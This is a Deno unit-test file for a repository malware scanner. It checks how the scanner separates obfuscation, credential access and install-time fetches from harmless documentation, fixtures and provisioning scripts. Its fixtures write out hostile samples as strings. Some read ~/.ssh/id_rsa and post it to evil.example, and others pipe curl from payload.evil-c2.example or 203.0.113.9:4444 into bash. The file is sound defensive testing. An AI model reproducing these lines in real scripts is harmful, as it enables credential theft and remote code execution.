/**
 * Unit tests for the static-scan heuristics. Two precision properties are guarded:
 *
 *  1. OBFUSCATION precision: legitimate dynamic-code (`new Function('…')`) must NOT
 *     trip the binary `obfuscation` signal (which auto-escalates and weighs -42),
 *     while real obfuscation (eval-of-decoded, long base64 blobs) still must.
 *
 *  2. DOC-vs-CODE precision (credential-access false-positive fix): a README/doc
 *     that merely MENTIONS a credential path, secret format, or network literal in
 *     prose must NOT set the binary code signals (credAccess -40, embeddedSecret,
 *     network), while actual source code performing those accesses still MUST.
 *
 * Run: `deno test supabase/functions/_shared/static-scan.test.ts`
 */

import { assert, assertEquals } from "jsr:@std/assert@1";
import { staticScan } from "./static-scan.ts";
import type { FetchedFile } from "./github.ts";

function file(path: string, content: string): FetchedFile {
  return { path, content, truncated: false };
}

Deno.test("legit `new Function('literal')` is NOT obfuscation, but is flagged as a region", () => {
  // Arrange — morgan-style format compiler: legitimate metaprogramming.
  const morganLike = file(
    "index.js",
    [
      "function compile(format) {",
      "  const js = '  return \"' + format.replace(/:(\\w+)/g, '\" + (tokens.$1(req,res)) + \"') + '\"';",
      "  return new Function('tokens, req, res', js);",
      "}",
      "module.exports = compile;",
    ].join("\n"),
  );

  // Act
  const result = staticScan([morganLike]);

  // Assert — no binary obfuscation signal (so no auto-escalation / -42)…
  assertEquals(result.signals.obfuscation, false, "new Function must not set the obfuscation signal");
  assertEquals(result.severityHint, "clean", "a legit metaprogramming repo stays clean");
  // …but the region IS surfaced for the read model to judge in context.
  assert(
    result.flaggedRegions.some((r) => /dynamic Function constructor/.test(r.reason)),
    "new Function should still be flagged as a region for the model",
  );
});

Deno.test("real obfuscation (eval of decoded payload) DOES set the obfuscation signal", () => {
  // Arrange
  const evil = file(
    "payload.js",
    "const x = eval(atob('Y29uc29sZS5sb2coMSk='));",
  );

  // Act
  const result = staticScan([evil]);

  // Assert
  assertEquals(result.signals.obfuscation, true, "eval(atob(...)) must set obfuscation");
  assertEquals(result.severityHint, "high");
});

Deno.test("Function() of a long base64 blob still trips obfuscation", () => {
  // Arrange — 120+ base64 chars handed to the Function constructor.
  const blob = "A".repeat(160);
  const evil = file("bundle.js", `const f = new Function("${blob}");`);

  // Act
  const result = staticScan([evil]);

  // Assert
  assertEquals(result.signals.obfuscation, true, "Function('<long base64>') must set obfuscation");
});

Deno.test("a fully clean source file trips no code signals", () => {
  // Arrange
  const clean = file(
    "math.js",
    "export function add(a, b) { return a + b; }\nexport const PI = 3.14159;",
  );

  // Act
  const result = staticScan([clean]);

  // Assert
  assertEquals(result.signals.obfuscation, false);
  assertEquals(result.signals.credAccess, false);
  assertEquals(result.signals.network, false);
  assertEquals(result.signals.embeddedSecret, false);
  assertEquals(result.severityHint, "clean");
});

Deno.test("credential-path access is still detected (regression guard)", () => {
  // Arrange
  const stealer = file("index.js", "const k = fs.readFileSync(process.env.HOME + '/.ssh/id_ed25519');");

  // Act
  const result = staticScan([stealer]);

  // Assert
  assertEquals(result.signals.credAccess, true, "SSH key path access must still flag");
  assertEquals(result.severityHint, "high");
});

Deno.test("new Function of a 60+ char encoded LITERAL trips obfuscation (H1 regression fix)", () => {
  // Arrange — an 80-char base64 literal handed to new Function (sub-120, the gap
  // the prior threshold left open). Pure base64 charset, no spaces.
  const blob = "QWxhZGRpbjpvcGVuc2VzYW1lQWxhZGRpbjpvcGVuc2VzYW1lQWxhZGRpbjpvcGVuc2VzYW1l"; // 72 chars
  const evil = file("p.js", `const f = new Function('${blob}'); f();`);

  // Act
  const result = staticScan([evil]);

  // Assert — now a HARD signal again (was only a soft region before the fix).
  assertEquals(result.signals.obfuscation, true, "60+ char encoded literal in new Function must trip obfuscation");
  assertEquals(result.severityHint, "high");
});

Deno.test("new Function(atob(...)) — decoded payload into Function — trips obfuscation (H2 hard)", () => {
  // Arrange
  const evil = file("p.js", "const f = new Function(atob('cmV0dXJuIDE=')); f();");

  // Act
  const result = staticScan([evil]);

  // Assert
  assertEquals(result.signals.obfuscation, true, "Function(atob(...)) must trip obfuscation");
});

Deno.test("new Function(variable) is flagged as a REGION (no false signal) — H2 soft", () => {
  // Arrange — a computed argument (payload could be decoded into the var at run
  // time). Region-only so the model sees it; NOT a hard signal on its own.
  const code = file("p.js", "const payload = decode(x);\nconst f = new Function(payload);");

  // Act
  const result = staticScan([code]);

  // Assert
  assertEquals(result.signals.obfuscation, false, "a bare computed-arg new Function is not itself obfuscation");
  assert(
    result.flaggedRegions.some((r) => /computed argument/.test(r.reason)),
    "new Function(variable) must still be surfaced as a region for the model",
  );
});

// --- Doc-vs-code distinction (credential-access false-positive fix) ----------
// A README/doc that merely MENTIONS a credential path in prose must NOT trip the
// binary credAccess signal (which weighs -40 and would false-flag a repo as
// "Dangerous"), while actual code that reads a credential path still MUST. This
// is the exact google-labs-code/design.md failure: a README describing ".npmrc
// registry configuration" scored 51/100 "High risk" purely on a -40 credAccess.

Deno.test("README merely MENTIONING .npmrc in prose does NOT set credAccess (design.md repro)", () => {
  // Arrange — the exact shape of the live false positive: a documentation file
  // describing .npmrc registry configuration in prose, no executable access.
  const readme = file(
    "README.md",
    [
      "# design.md",
      "",
      "A design specification project under the Google Labs organization.",
      "",
      "## Registry configuration",
      "",
      "For corporate development environments, configure your `.npmrc` to point",
      "at the internal registry. This project never reads your `~/.ssh` keys or",
      "your `.aws/credentials`; those are mentioned here only for documentation.",
    ].join("\n"),
  );

  // Act
  const result = staticScan([readme]);

  // Assert — the binary signal must NOT fire on a prose mention…
  assertEquals(
    result.signals.credAccess,
    false,
    "a README mentioning .npmrc/.ssh/.aws in prose must NOT set credAccess (no -40 penalty)",
  );
  // …and with no other code signal, the repo stays clean, not "high".
  assertEquals(
    result.severityHint,
    "clean",
    "a docs-only repo mentioning credential paths in prose must not be scored high-severity",
  );
  // …but the mention IS still surfaced as a region so the read model sees it and
  // the report can honestly cite it (never-bare-Safe: we say what we saw).
  assert(
    result.flaggedRegions.some(
      (r) => /mentioned in documentation\/prose/.test(r.reason) && /npmrc/.test(r.reason),
    ),
    "the prose .npmrc mention must still be surfaced as a documentation region for the model",
  );
});

Deno.test("real CODE reading a credential path STILL sets credAccess at full severity (no regression)", () => {
  // Arrange — genuine credential theft: source code that reads ~/.ssh at runtime.
  const stealer = file(
    "src/exfil.js",
    "const fs = require('fs');\n" +
      "const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');\n" +
      "fetch('https://evil.example/collect', { method: 'POST', body: key });",
  );

  // Act
  const result = staticScan([stealer]);

  // Assert — the signal MUST still fire at full severity for real code.
  assertEquals(
    result.signals.credAccess,
    true,
    "code that reads ~/.ssh/id_rsa MUST still set credAccess (the -40 penalty must not be weakened)",
  );
  assertEquals(result.severityHint, "high", "real credential-reading code stays high-severity");
});

Deno.test("credential path in a docs/ directory file (any extension) is prose, not access", () => {
  // Arrange — docs live under docs/ regardless of extension; a config example
  // there is documentation, not executable code.
  const doc = file(
    "docs/setup-guide.txt",
    "Place your npm auth token in ~/.npmrc and your cloud creds in .aws/credentials.",
  );

  // Act
  const result = staticScan([doc]);

  // Assert
  assertEquals(result.signals.credAccess, false, "a docs/ guide mentioning credential paths is prose, not access");
  assertEquals(result.severityHint, "clean");
});

Deno.test("a doc mention alongside real code: code still trips the signal", () => {
  // Arrange — a repo with BOTH a benign README mention AND a real credential read
  // in source. The signal must fire (driven by the code), proving the doc file
  // does not mask a genuine access elsewhere in the same repo.
  const readme = file("README.md", "Configure `.npmrc` for the internal registry.");
  const code = file("index.js", "const k = fs.readFileSync(process.env.HOME + '/.ssh/id_ed25519');");

  // Act
  const result = staticScan([readme, code]);

  // Assert
  assertEquals(result.signals.credAccess, true, "real code access must still set credAccess even beside a benign doc mention");
  assertEquals(result.severityHint, "high");
});

// --- Provisioning-fetch vs. confirmed-attack distinction ---------------------
// A BUILD/PROVISION-time `curl|wget` fetch-and-run to a recognized software-
// distribution host, with no credential access in the same file, is a
// supply-chain CAUTION — mirroring the dynamic sandbox's own phase-aware
// classification (assemble-forensics.py). It must not, on its own, trip the
// hard `installTimeNetwork` escalation trigger or the "medium" severity band.
// A fetch to an unrecognized host, or one alongside credential access, MUST
// still keep full weight — this narrows one false-positive, not real attacks.

Deno.test("infra-provisioning fetch to a recognized host (docker) is a caution, not installTimeNetwork", () => {
  // Arrange — a real shape from this repo's own sandbox/ setup scripts.
  const provision = file(
    "sandbox/golden-image/startup-provision.sh",
    "#!/usr/bin/env bash\nset -euo pipefail\ncurl -fsSL https://get.docker.com | sh\n",
  );

  // Act
  const result = staticScan([provision]);

  // Assert — surfaced, but not a hard escalation trigger.
  assertEquals(result.installTimeNetwork, false, "a recognized-host provisioning fetch must not set installTimeNetwork");
  assertEquals(result.signals.network, true, "the fetch is still a real network signal");
  assertEquals(result.severityHint, "low", "recognized-host provisioning alone must not reach medium/high");
  assert(
    result.flaggedRegions.some((r) => /recognized software-distribution host \(get\.docker\.com\)/.test(r.reason)),
    "the provisioning fetch must be surfaced as a region naming the recognized host",
  );
});

Deno.test("shell fetch to an UNRECOGNIZED host in an install script still sets installTimeNetwork (regression guard)", () => {
  // Arrange — same shape, but the host is not a known distribution point.
  const attack = file(
    "install.sh",
    "#!/usr/bin/env bash\ncurl -fsSL https://payload.evil-c2.example/x | bash\n",
  );

  // Act
  const result = staticScan([attack]);

  // Assert — MUST keep full weight; the fix narrows one false-positive, not attacks.
  assertEquals(result.installTimeNetwork, true, "an unrecognized-host install-time fetch must still set installTimeNetwork");
  assertEquals(result.severityHint, "medium");
  assert(
    result.flaggedRegions.some((r) => /unrecognized host \(payload\.evil-c2\.example\)/.test(r.reason)),
    "the unrecognized-host fetch must be surfaced plainly as such",
  );
});

Deno.test("a recognized-host fetch ALONGSIDE credential access in the same file still sets installTimeNetwork (no credential involvement required)", () => {
  // Arrange — the recognized host alone is not enough to downgrade if the same
  // file also reads a credential path (mirrors the dynamic path's "no credential
  // involvement" condition).
  const mixed = file(
    "setup.sh",
    "#!/usr/bin/env bash\ncat ~/.aws/credentials\ncurl -fsSL https://github.com/foo/bar/releases/download/v1/tool.sh | bash\n",
  );

  // Act
  const result = staticScan([mixed]);

  // Assert
  assertEquals(result.signals.credAccess, true);
  assertEquals(result.installTimeNetwork, true, "credential access in the same file must negate the recognized-host downgrade");
  assertEquals(result.severityHint, "high", "credAccess alone already drives high severity");
});

Deno.test("a non-install-context file with a recognized-host curl fetch never sets installTimeNetwork regardless", () => {
  // Arrange — the same fetch, but not in an install/provisioning-shaped file at all.
  const doc = file(
    "scripts/fetch-docs.py",
    "import subprocess\nsubprocess.run(['curl', '-fsSL', 'https://github.com/foo/bar'])\n",
  );

  // Act
  const result = staticScan([doc]);

  // Assert
  assertEquals(result.installTimeNetwork, false);
});

Deno.test("hardcoded IP literal in an install script keeps full weight even with no curl match (unaffected by the host allowlist)", () => {
  // Arrange — a hardcoded IP is never a "recognized software-distribution host"
  // shape; the allowlist carve-out must not touch this pattern at all.
  const suspicious = file("bootstrap.sh", "curl http://203.0.113.9:4444/stage2.sh | bash\n");

  // Act
  const result = staticScan([suspicious]);

  // Assert — this matches BOTH the hardcoded-IP-URL pattern (always full weight)
  // and the shell-fetch pattern (host is an IP literal, never in the allowlist).
  assertEquals(result.installTimeNetwork, true, "a hardcoded-IP fetch in an install script must keep full weight");
  assertEquals(result.severityHint, "medium");
});

Deno.test("embedded-secret / network literals in docs are prose too (systemic doc-vs-code fix)", () => {
  // Arrange — a README documenting an example AWS key format and an example IP.
  // These are documentation, not a committed live secret or a real network call.
  const readme = file(
    "README.md",
    [
      "Example access key id format: AKIAIOSFODNN7EXAMPLE",
      "During local dev the service listens on http://127.0.0.1:8080",
    ].join("\n"),
  );

  // Act
  const result = staticScan([readme]);

  // Assert — no binary code signals fire on prose examples…
  assertEquals(result.signals.embeddedSecret, false, "an example key format in a README is not an embedded secret");
  assertEquals(result.signals.network, false, "an example IP:port in a README is not a network capability");
  assertEquals(result.severityHint, "clean");
  // …but they are still surfaced as documentation regions for the model.
  assert(
    result.flaggedRegions.some((r) => /mentioned in documentation\/prose/.test(r.reason)),
    "doc-side matches must still be surfaced as regions for the model",
  );
});

// ─────────────────────────────────────────────────────────────────────────────
// TEST-FIXTURE / SECURITY-TOOLING context (the security-tooling false-positive
// fix). A credential-PATH reference inside a genuine test/fixture/example file is
// a self-contained simulation, not a runtime credential theft, and must NOT set
// the -40 credAccess signal — UNLESS the same file also shows a harder tell
// (obfuscation / embedded live secret), which keeps full weight so a real attack
// cannot hide behind a "fixture" filename. Both directions are asserted.
// ─────────────────────────────────────────────────────────────────────────────

Deno.test("credential-path read inside a *-fixture file is region-only, NOT a credAccess signal (Direction A)", () => {
  // Arrange — the exact shape of this product's own exfil-fixture.py: a disclosed
  // attack SIMULATION that reads ~/.aws/credentials. No obfuscation, no live secret.
  const fixture = file(
    "sandbox/microvm/forge/exfil-fixture.py",
    [
      "import os",
      'CRED_PATHS = ["/root/.aws/credentials", os.path.expanduser("~/.aws/credentials")]',
      "def run():",
      "    for p in CRED_PATHS:",
      "        if os.path.exists(p):",
      "            creds = open(p).read()",
    ].join("\n"),
  );

  // Act
  const result = staticScan([fixture]);

  // Assert — the -40 credential-access signal does NOT fire on a disclosed fixture…
  assertEquals(result.signals.credAccess, false, "a credential-path read in a *-fixture file must not set credAccess");
  assertEquals(result.severityHint, "clean", "a disclosed test fixture must not read as high-severity");
  // …but the finding is still surfaced as a region, honestly tagged as fixture context.
  assert(
    result.flaggedRegions.some((r) => /test-fixture context/.test(r.reason)),
    "the credential-path region must still be surfaced with test-fixture context for the model",
  );
});

Deno.test("the SAME credential-path read in a normal source file DOES set credAccess (no blanket downgrade)", () => {
  // Arrange — identical content, but NOT a test/fixture/example path.
  const source = file(
    "src/collect.py",
    [
      "import os",
      'CRED_PATHS = ["/root/.aws/credentials", os.path.expanduser("~/.aws/credentials")]',
      "def run():",
      "    creds = open(CRED_PATHS[0]).read()",
    ].join("\n"),
  );

  // Act
  const result = staticScan([source]);

  // Assert — real runtime credential access in shipped source keeps full weight.
  assertEquals(result.signals.credAccess, true, "credential access in normal source must set credAccess");
  assertEquals(result.severityHint, "high");
});

Deno.test("obfuscation in a *-fixture file is NEVER downgraded, and it keeps credAccess at full weight too (Direction B)", () => {
  // Arrange — a real attack wearing a fixture filename: reads an SSH key AND hides
  // an eval-of-decoded payload. The "fixture" label must not save it.
  const fakeFixture = file(
    "tests/payment-fixture.js",
    [
      "const fs = require('fs');",
      "const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');",
      "eval(atob('dmFyIHg9MTs='));",
    ].join("\n"),
  );

  // Act
  const result = staticScan([fakeFixture]);

  // Assert — obfuscation always fires; and because a harder tell is present in the
  // same file, the credential-path signal is NOT downgraded either.
  assertEquals(result.signals.obfuscation, true, "obfuscation is never softened by a fixture path");
  assertEquals(result.signals.credAccess, true, "credAccess keeps full weight when the fixture file is also obfuscated");
  assertEquals(result.severityHint, "high");
});

Deno.test("an embedded live private key in a *-fixture file keeps credAccess at full weight", () => {
  // Arrange — a committed private key is a real leaked secret regardless of a
  // "fixture" filename, so the fixture downgrade must not apply to credAccess here.
  const fixtureWithKey = file(
    "tests/fixtures/creds.spec.js",
    [
      "const key = `-----BEGIN OPENSSH PRIVATE KEY-----`;",
      "const p = require('os').homedir() + '/.ssh/id_rsa';",
    ].join("\n"),
  );

  // Act
  const result = staticScan([fixtureWithKey]);

  // Assert — embedded secret fires, and credAccess is NOT downgraded next to it.
  assertEquals(result.signals.embeddedSecret, true, "an embedded private key always fires embeddedSecret");
  assertEquals(result.signals.credAccess, true, "credAccess keeps full weight when a live secret is embedded in the same fixture");
});

Deno.test("test-fixture classification is anchored: 'latest'/'attestation' are NOT fixtures", () => {
  // Arrange — filenames/paths that merely CONTAIN 'test' as a substring must not be
  // mistaken for test files, or the downgrade would over-apply to shipped source.
  const notFixtureA = file(
    "src/latest.ts",
    'const p = require("os").homedir() + "/.aws/credentials"; open(p);',
  );
  const notFixtureB = file(
    "src/attestation/verify.ts",
    'const p = require("os").homedir() + "/.aws/credentials"; open(p);',
  );

  // Act + Assert — both keep full credential-access weight (not downgraded).
  assertEquals(staticScan([notFixtureA]).signals.credAccess, true, "'latest.ts' must not be treated as a test file");
  assertEquals(staticScan([notFixtureB]).signals.credAccess, true, "'src/attestation/...' must not be treated as a test dir");
});

// ─────────────────────────────────────────────────────────────────────────────
// PRIVATE-IP + INSTALL-CONTEXT precision (the infra/security-tooling false-positive
// that scored this product's OWN repo "Malicious" via install-time network). A
// private/loopback IP is internal infra, never egress; and a standalone provisioning
// script is not the auto-run install-time-exfil vector a lifecycle hook is.
// ─────────────────────────────────────────────────────────────────────────────

Deno.test("a loopback/private IP is internal infra, NOT network egress", () => {
  // A localhost health check + an RFC1918 gateway reference — both internal.
  const infra = file(
    "provision-forge-gateway.sh",
    "#!/usr/bin/env bash\ncurl -fsS http://127.0.0.1:8090/healthz\niptables -A FORWARD -d 10.200.0.10 -j ACCEPT\n",
  );
  const result = staticScan([infra]);
  assertEquals(result.signals.network, false, "a loopback/private IP must not set the network signal");
  assertEquals(result.installTimeNetwork, false, "a loopback IP in an infra script must not set installTimeNetwork");
  assertEquals(result.severityHint, "clean");
  // Still surfaced as a region, honestly labeled as internal.
  assert(
    result.flaggedRegions.some((r) => /internal\/loopback address/.test(r.reason)),
    "the internal IP must still be surfaced as a region, labeled internal",
  );
});

Deno.test("a PUBLIC hardcoded IP still sets the network signal", () => {
  const pub = file("client.js", "fetch('http://203.0.113.9/collect')");
  const result = staticScan([pub]);
  assertEquals(result.signals.network, true, "a public hardcoded IP must still be a network signal");
});

Deno.test("a standalone provisioning script is NOT install-time (only lifecycle-named scripts are)", () => {
  // forge-up.sh does a DNS reachability probe to a public resolver. It is a script a
  // human runs deliberately, NOT an auto-running install hook — so it is general network
  // capability (-6-worthy), not the -40 install-time-exfil signal.
  const provisioning = file(
    "forge-up.sh",
    "#!/usr/bin/env bash\nnc -z 8.8.8.8 53 || echo 'no DNS'\ncurl -fsSL https://deb.nodesource.com/setup | bash\n",
  );
  const result = staticScan([provisioning]);
  assertEquals(result.installTimeNetworkHard, false, "a standalone provisioning script must not be install-time-hard");
  assertEquals(result.installTimeNetwork, false, "…and must not set installTimeNetwork on its own");
});

Deno.test("an ACTUAL install hook with a public-IP fetch STILL keeps full install-time weight (no weakening)", () => {
  // The narrowing must not soften the real vector: a postinstall.sh that fetches a raw
  // public IP is exactly the auto-run install-time exfil this signal exists for.
  const hook = file("postinstall.sh", "curl http://203.0.113.9:4444/stage2.sh | bash\n");
  const result = staticScan([hook]);
  assertEquals(result.installTimeNetwork, true, "a real install hook fetching a public IP must keep full weight");
  assertEquals(result.severityHint, "medium");
});
